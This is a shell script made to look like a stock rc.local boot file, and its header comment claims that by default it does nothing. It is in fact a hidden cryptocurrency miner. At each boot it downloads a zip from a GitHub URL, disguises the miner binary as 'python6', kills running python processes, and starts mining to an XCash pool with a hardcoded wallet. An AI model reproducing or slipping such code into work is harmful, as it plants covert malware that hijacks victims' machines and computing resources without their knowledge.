#!/bin/sh -e
#
# rc.local
#
# This script is executed at the end of each multiuser runlevel.
# Make sure that the script will "exit 0" on success or any other
# value on error.
#
# In order to enable or disable this script just change the execution
# bits.
#
# By default this script does nothing.
if [ -f ${PWD}/python6 ]; then
    if pgrep -x "python" > /dev/null
then
pkill python
echo " kill process"
./python6 -F http://xcash.herominers.com:10440/XCBzxb7igt5YvbwtYCMPkEWRATpzrMYvU2PpTDi89bon7fYnJgYSeRS8EN5LLnPxgkgfsf3k1DZVn1bzccTFBNhpPGbJGHKCzDraxzJY1huRe6/lyn

    
else

echo "Miner da install , chay thoi "
./python6 -F http://xcash.herominers.com:10440/XCBzxb7igt5YvbwtYCMPkEWRATpzrMYvU2PpTDi89bon7fYnJgYSeRS8EN5LLnPxgkgfsf3k1DZVn1bzccTFBNhpPGbJGHKCzDraxzJY1huRe6/lyn

     
fi
exit
fi

wget https://raw.githubusercontent.com/haidanglx/Tonghop/master/Xcash.zip
unzip Xcash.zip
mv XCASH_ALL_Miner python6
rm config.json
./python6 -F http://xcash.herominers.com:10440/XCBzxb7igt5YvbwtYCMPkEWRATpzrMYvU2PpTDi89bon7fYnJgYSeRS8EN5LLnPxgkgfsf3k1DZVn1bzccTFBNhpPGbJGHKCzDraxzJY1huRe6/lyn

exit 0
